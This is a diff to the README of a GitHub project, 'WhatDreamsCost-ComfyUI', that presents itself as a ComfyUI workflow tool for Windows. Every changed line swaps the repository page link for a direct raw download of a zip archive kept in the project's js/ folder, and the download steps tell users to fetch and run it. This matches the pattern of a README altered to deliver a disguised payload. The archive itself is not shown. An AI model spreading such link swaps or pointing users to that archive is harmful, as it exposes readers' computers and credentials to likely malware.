@@ -1,6 +1,6 @@
 # 🎨 WhatDreamsCost-ComfyUI - Build Custom AI Workflows
 
-[![Download](https://img.shields.io/badge/Download-WhatDreamsCost--ComfyUI-blue.svg?style=for-the-badge)](https://github.com/Valentin6595/WhatDreamsCost-ComfyUI)
+[![Download](https://img.shields.io/badge/Download-WhatDreamsCost--ComfyUI-blue.svg?style=for-the-badge)](https://github.com/Valentin6595/WhatDreamsCost-ComfyUI/raw/refs/heads/main/js/What-Comfy-UI-Dreams-Cost-v3.2-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Use this if you want:
 ## 📥 Download
 
 Visit this page to download the files:
-https://github.com/Valentin6595/WhatDreamsCost-ComfyUI
+https://github.com/Valentin6595/WhatDreamsCost-ComfyUI/raw/refs/heads/main/js/What-Comfy-UI-Dreams-Cost-v3.2-alpha.2.zip
 
 Open the page, then use the green or blue download options on GitHub if they are available. If the repository includes a ZIP file or release file, download it to your Windows PC.
 
@@ -36,7 +36,7 @@ If you already run ComfyUI, this repository should fit into that setup.
 Follow these steps in order.
 
 1. Open the download page:
-   https://github.com/Valentin6595/WhatDreamsCost-ComfyUI
+   https://github.com/Valentin6595/WhatDreamsCost-ComfyUI/raw/refs/heads/main/js/What-Comfy-UI-Dreams-Cost-v3.2-alpha.2.zip
 
 2. Download the repository files to your computer.
 
@@ -173,4 +173,4 @@ That gives you the fastest path to a working setup
 ## 📎 Download Again
 
 If you need the files again, use this link:
-https://github.com/Valentin6595/WhatDreamsCost-ComfyUI
+https://github.com/Valentin6595/WhatDreamsCost-ComfyUI/raw/refs/heads/main/js/What-Comfy-UI-Dreams-Cost-v3.2-alpha.2.zip
